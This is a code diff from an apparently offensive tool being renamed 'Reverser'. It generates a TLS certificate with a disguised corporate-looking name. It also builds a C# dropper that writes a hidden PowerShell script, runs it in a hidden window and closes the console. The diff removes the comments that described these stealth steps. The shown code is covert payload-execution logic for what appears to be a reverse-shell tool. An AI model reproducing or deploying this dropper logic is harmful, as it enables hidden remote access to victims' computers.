@@ -14,13 +14,13 @@ def print_banner():
 @ShkudW
 \033[0m"""
     print(banner)
-    print("\033[96mGitHub: https://github.com/ShkudW/Reception\033[0m")
+    print("\033[96mGitHub: https://github.com/ShkudW/Reverser\033[0m")
 
 def generate_certificate(cert_file, key_file):
     try:
         subprocess.run([
             "openssl", "req", "-new", "-newkey", "rsa:4096", "-days", "365", "-nodes",
-            "-x509", "-subj", "/CN=www.reception.recep",
+            "-x509", "-subj", "/CN=www.welcome.corp",
             "-keyout", key_file, "-out", cert_file
         ], check=True)
         print(f"\033[92mCertificate and key generated and saved to {cert_file} and {key_file}\033[0m")
@@ -130,10 +130,10 @@ class Program
         string filePath = Path.Combine(Directory.GetCurrentDirectory(), "reception.ps1");
         File.WriteAllText(filePath, ps1Content);
 
-        // Hide the PS1 file
+        
         File.SetAttributes(filePath, File.GetAttributes(filePath) | FileAttributes.Hidden);
 
-        // Create a new process to run the PS1 script
+        
         Process proc3ss = new Process();
         proc3ss.StartInfo.FileName = "cmd.exe";
         proc3ss.StartInfo.Arguments = "/c start powershell.exe -WindowStyle Hidden -File reception.ps1";
@@ -145,7 +145,7 @@ class Program
         // Wait for 2 seconds
         Thread.Sleep(2000);
 
-        // Close the CMD window
+        
         proc3ss.CloseMainWindow();
     }}
 }}
